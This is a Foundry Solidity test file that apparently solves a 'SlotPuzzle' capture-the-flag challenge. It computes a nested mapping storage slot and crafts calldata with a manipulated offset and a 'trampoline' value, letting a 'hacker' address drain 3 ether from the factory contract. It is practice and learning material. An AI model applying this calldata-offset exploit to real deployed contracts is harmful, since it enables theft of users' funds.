// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import {SlotPuzzle} from "src/SlotPuzzle.sol";
import {SlotPuzzleFactory} from "src/SlotPuzzleFactory.sol";
import {Parameters,Recipients} from "src/ISlotPuzzleFactory.sol";


contract SlotPuzzleTest is Test {
	SlotPuzzle public slotPuzzle;
	SlotPuzzleFactory public slotPuzzleFactory;
	address hacker;

	function setUp() public {
		slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
		hacker = makeAddr("hacker");
	}

	function testHack() public {
		vm.startPrank(hacker,hacker);
		assertEq(address(slotPuzzleFactory).balance, 3 ether, "weth contract should have 3 ether");

		//hack time

		uint slot;
		{ // calculate slot
			// for: `ghostInfo[tx.origin][block.number]`
			slot = MKK(uint(uint160(hacker)), block.number, 1);

			// for: `.map[block.timestamp][msg.sender]`
			slot += 1; // Struct member `ghostStore.map` is at slot 1
			slot = MKK(block.timestamp, uint(uint160(address(slotPuzzleFactory))), slot);

			// for: `.map[block.prevrandao][block.coinbase]`
			slot += 1; // Struct member `ghostStore.map` is at slot 1
			slot = MKK(block.prevrandao, uint(uint160(address(block.coinbase))), slot);

			// for: `.map[block.chainid][address(uint160(uint256(blockhash(block.number - block.basefee))))]`
			slot += 1; // Struct member `ghostStore.map` is at slot 1
			slot = MKK(block.chainid, uint(blockhash(block.number - block.basefee)), slot);

			// for: `.hash.push(ghost);`
			slot = uint(keccak256(abi.encode(slot)));
		}

		Parameters memory params;
		{ // build Parameters
			params.totalRecipients = 3; // same as recipients.length
			params.offset = 0x1c4; // points to last 32bytes

			Recipients memory recip; // add `hacker` as recipient 3 times
			recip.account = hacker;
			recip.amount = 1 ether; // has to be 1 ether
			params.recipients = new Recipients[](3);
			for(uint i=0; i<3; i++) {
				params.recipients[i] = recip;
			}

			// append an extra 32bytes(value 0x124) to the end, which acts as
			// a trampoline, points to the real slot
			params.slotKey = abi.encode(slot, uint(0x124));
		}

		slotPuzzleFactory.deploy(params);

		// ---- end of hack ----

		assertEq(address(slotPuzzleFactory).balance, 0, "weth contract should have 0 ether");
		assertEq(address(hacker).balance, 3 ether, "hacker should have 3 ether");

		vm.stopPrank();
	}

	// calculate slot number of `map[key]`
	function MK(uint key, uint mapSelfSlotIndex) public pure returns(uint) {
		return uint(keccak256(abi.encode(key, mapSelfSlotIndex)));
	}
	// calculate slot number of `map[key1][key2]`
	function MKK(uint key1, uint key2, uint mapSelfSlotIndex) public pure returns(uint) {
		uint slot1 = MK(key1, mapSelfSlotIndex);
		return MK(key2, slot1);
	}
}
